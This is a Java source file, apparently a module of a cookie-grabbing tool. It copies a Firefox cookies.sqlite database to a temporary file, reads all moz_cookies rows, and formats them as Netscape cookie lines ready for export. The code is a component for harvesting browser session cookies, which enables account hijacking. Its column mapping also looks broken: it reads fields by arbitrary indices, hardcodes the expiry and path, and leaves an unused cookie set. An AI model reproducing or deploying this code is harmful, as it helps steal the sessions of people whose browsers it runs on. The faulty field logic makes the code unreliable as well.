package _256.utils.decrypt.cookie;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.UUID;

import org.apache.commons.io.FileUtils;

public class MozillaCookieDecrypt {

	private File COOKIE_PATH = null;
	public List<String> COOKIE_DATA;
	public List<String> COOKIES;

	public MozillaCookieDecrypt(String path0) {
		this.COOKIE_PATH = new File(path0);
		this.COOKIES = new ArrayList<String>();
		this.COOKIE_DATA = new ArrayList<String>();
	}

	public String getData() {
		StringBuilder temp = new StringBuilder();
		COOKIES.stream().forEach(cookie -> temp.append(cookie + "\n"));
		return temp.toString();
	}

	public MozillaCookieDecrypt getCookies() {
		HashSet<Cookie> cookies = new HashSet<>();
		Connection connection = null;
		File tempFile = null;
		try {
			tempFile = new File(UUID.randomUUID().toString());
			FileUtils.copyFile(this.COOKIE_PATH, tempFile);
			Class.forName("org.sqlite.JDBC");
			connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
			Statement statement = connection.createStatement();
			statement.setQueryTimeout(30);
			ResultSet resultSet = statement.executeQuery("SELECT * FROM moz_cookies");
			while (resultSet.next()) {
				String name = resultSet.getString("name");
				parseCookieFromResult(tempFile, name, cookies, resultSet);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		} finally {
			try {
				if (connection != null) {
					connection.close();
				}
			} catch (Exception e) {
			}
		}
		tempFile.delete();
		return this;
	}

	private void parseCookieFromResult(File cookieStore, String name, HashSet<Cookie> cookieSet, ResultSet resultSet) throws SQLException {
		String url = resultSet.getString(5);
		String secure = resultSet.getString(3);
		String secretKey = resultSet.getString(4);
		Boolean bool1 = resultSet.getBoolean(1);
		Boolean bool2 = resultSet.getBoolean(2);
		String path = "/";
		String expires = "1679385983";
		if (secretKey != null) {
			String format = url + "\t" + String.valueOf(bool1).toUpperCase() + "\t" + path + "\t" + String.valueOf(bool2).toUpperCase() + "\t" + expires + "\t" + secure + "\t" + secretKey;
			COOKIES.add(format);
		}
	}
}
